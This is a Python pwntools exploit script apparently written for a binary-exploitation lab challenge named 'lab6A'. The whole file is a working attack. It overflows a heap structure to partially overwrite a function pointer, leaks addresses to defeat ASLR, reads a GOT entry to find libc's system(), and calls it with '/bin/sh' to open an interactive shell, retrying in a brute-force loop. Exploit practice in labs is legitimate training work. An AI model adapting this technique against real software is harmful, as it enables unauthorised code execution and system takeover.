from pwn import *
import subprocess
import time
import signal
import os

exit_on_next_iter = False

def sigint_handler(signum, frame):
    global exit_on_next_iter
    term_gdb.kill()
    # os._exit(1)
    exit_on_next_iter = True
    exit()
 
signal.signal(signal.SIGINT, sigint_handler)

def read_primitive(addr, base_address):
    # Call read address at address
    r.sendline('1')
    print r.read(200)
    r.sendline(p32(addr) + 'B'*26 + '\x00')
    print r.read(200)
    r.sendline('B'*92 + p16((base_address&0xf000)+0x097a) + '\x00')
    print r.read(200)
    r.sendline('3')
    resp = r.read(200)
    print resp
    print resp.encode('hex')
    return resp[:8]

def call_system_bin_sh(func_system):
    # Call system at address at func_system with argument /bin/sh #CCC...
    r.sendline('1')
    print r.read(200)
    r.sendline("/bin/sh #" + 'C'*21 + '\x00')
    print r.read(200)
    r.sendline('C'*92 + p32(func_system) + '\x00')
    print r.read(200)
    r.sendline('3')

max_iter = 32
i = 0
while (i < max_iter and exit_on_next_iter == False):
    try:
        r = process("./lab6A")

        print r.read(500)

        # Call print_name to leak the memory pointer
        r.sendline('1')         # Setup Account
        print r.read(200)
        r.sendline('A'*31)      # Fill user->name with 31 'A's
        print r.read(200)
        r.sendline('A'*90 + '\xe2\x0b\x00') # Fill the user->desc and overflow LSB bytes of print_name into LSB bytes of uinfo->sfunc
        print r.read(200)
        r.sendline('3')         # Trigger the sfunc which is now the print_name
        resp = r.read(200)
        print resp
        ptr32 = u32(resp[170:174])
        print "0x%08x" % ptr32

        # write_system_libc_offset = 0xa9b80  # native (didn't work as there is a null byte LSByte in system address)
        write_system_libc_offset = 0x9aac0  # vm

        write_got_address = ptr32 + 0x245a
        write_libc_address_bytes = read_primitive(write_got_address, ptr32)[:4]
        write_libc_address = u32(write_libc_address_bytes)
        system_libc_address = write_libc_address - write_system_libc_offset
        print write_libc_address_bytes.encode('hex')
        print "%x"%system_libc_address

        call_system_bin_sh(system_libc_address)

        r.interactive()

    except:
        r.close()
    exit_on_next_iter == True
    i += 1
